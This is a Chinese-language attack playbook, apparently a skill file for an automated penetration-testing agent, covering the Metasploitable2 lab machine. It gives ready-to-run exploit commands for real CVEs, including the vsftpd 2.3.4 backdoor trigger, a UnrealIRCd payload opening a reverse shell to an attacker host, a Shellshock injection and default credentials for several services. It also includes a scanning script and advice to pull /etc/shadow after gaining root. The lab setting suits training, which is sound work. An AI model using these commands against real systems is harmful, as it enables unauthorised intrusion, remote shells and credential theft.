---
name: metasploitable2-attack-playbook
description: 'Metasploitable2 完整攻击手册 — 包含所有已知漏洞的检测和利用方法'
domain: penetration-testing
subdomain: metasploitable2
tags: [metasploitable2, playbook, full-attack, all-vulns, exploit]
version: '1.0'
source: prebuilt
---

# Metasploitable2 完整攻击手册

## When to Use
- 目标是 Metasploitable2 靶机
- 需要系统性地发现和利用所有已知漏洞

## 已知漏洞清单 (按优先级排序)

### 1. vsftpd 2.3.4 后门 (端口 21)
- CVE-2011-2523
- 检测: `nmap -sV -p 21 TARGET` → vsftpd 2.3.4
- 利用: `echo "USER backdoor:)" | nc TARGET 21` → `nc TARGET 6200`
- 权限: root

### 2. Samba username map script (端口 139/445)
- CVE-2007-2447
- 检测: `nmap -sV -p 139,445 TARGET` → Samba 3.x
- 利用: `msfconsole → exploit/multi/samba/usermap_script`
- 权限: root

### 3. UnrealIRCd 后门 (端口 6667)
- CVE-2010-2075
- 检测: `nmap -sV -p 6667 TARGET` → UnrealIRCd 3.2.8.1
- 利用: `echo "AB; nc YOUR_IP PORT -e /bin/bash" | nc TARGET 6667`
- 权限: root

### 4. Shellshock CGI (端口 80)
- CVE-2014-6271
- 检测: `curl -A "() { :;}; echo; id" http://TARGET/cgi-bin/status`
- 利用: 通过 User-Agent 注入命令
- 权限: www-data

### 5. Tomcat 默认口令 (端口 8180)
- 检测: `curl -u tomcat:tomcat http://TARGET:8180/manager/html`
- 利用: 上传 WAR 包获取 JSP shell
- 权限: tomcat

### 6. distcc 命令执行 (端口 3632)
- CVE-2004-2687
- 检测: `nmap -sV -p 3632 TARGET` → distccd
- 利用: `msfconsole → exploit/unix/misc/distcc_exec`
- 权限: daemon

### 7. MySQL 弱口令 (端口 3306)
- 检测: `mysql -u root -h TARGET` (无密码)
- 利用: UDF 提权
- 权限: root (通过 UDF)

### 8. PostgreSQL 弱口令 (端口 5432)
- 检测: `psql -h TARGET -U postgres` (密码: postgres)
- 利用: COPY FROM PROGRAM 执行命令
- 权限: postgres

### 9. SSH 弱口令 (端口 22)
- 检测: `ssh msfadmin@TARGET` (密码: msfadmin)
- 利用: 暴力破解或默认凭据
- 权限: msfadmin (可通过 sudo 提权)

### 10. VNC 无认证 (端口 5900)
- 检测: `nmap -sV -p 5900 TARGET`
- 利用: `vncviewer TARGET` 无密码直接连接
- 权限: root

### 11. PHP-CGI 参数注入 (端口 80)
- 检测: `curl http://TARGET/cgi-bin/php-cgi`
- 利用: `msfconsole → exploit/multi/http/php_cgi_arg_injection`

### 12. NFS 共享 (端口 2049)
- 检测: `showmount -e TARGET`
- 利用: `mount -t nfs TARGET:/ /mnt` 挂载根目录

### 13. rsh 信任关系 (端口 514)
- 检测: `rlogin TARGET -l root`
- 利用: 无需密码直接登录

## 推荐攻击顺序
1. 先全端口扫描: `rustscan -a TARGET --ulimit 5000 -- -Pn -sV --version-light`
2. 快速利用: vsftpd → Samba → UnrealIRCd (都是直接拿 root)
3. Web 层: Shellshock → Tomcat
4. 数据库: MySQL → PostgreSQL
5. 其他: distcc → SSH → VNC → NFS

## 自动化检测脚本
```bash
#!/bin/bash
TARGET=$1
echo "[*] 检测 vsftpd..."
nmap -sV -p 21 $TARGET | grep "vsftpd 2.3.4" && echo "[!] vsftpd 后门存在"

echo "[*] 检测 Samba..."
nmap -sV -p 139,445 $TARGET | grep "Samba 3" && echo "[!] Samba usermap 漏洞存在"

echo "[*] 检测 UnrealIRCd..."
nmap -sV -p 6667 $TARGET | grep "UnrealIRCd" && echo "[!] UnrealIRCd 后门存在"

echo "[*] 检测 MySQL..."
mysql -u root -h $TARGET -e "SELECT 1;" 2>/dev/null && echo "[!] MySQL 无密码"

echo "[*] 检测 PostgreSQL..."
psql -h $TARGET -U postgres -c "SELECT 1;" 2>/dev/null && echo "[!] PostgreSQL 弱口令"

echo "[*] 检测 VNC..."
nmap -sV -p 5900 $TARGET | grep "VNC" && echo "[!] VNC 可能无认证"
```

## 注意事项
- Metasploitable2 是专为渗透测试设计的靶机，包含 20+ 已知漏洞
- 所有漏洞都可以成功利用
- 获取多个 root shell 后，应该提取 /etc/shadow 和 /etc/passwd 作为凭据证据
- 记录每个成功利用的命令和输出，用于生成 skill
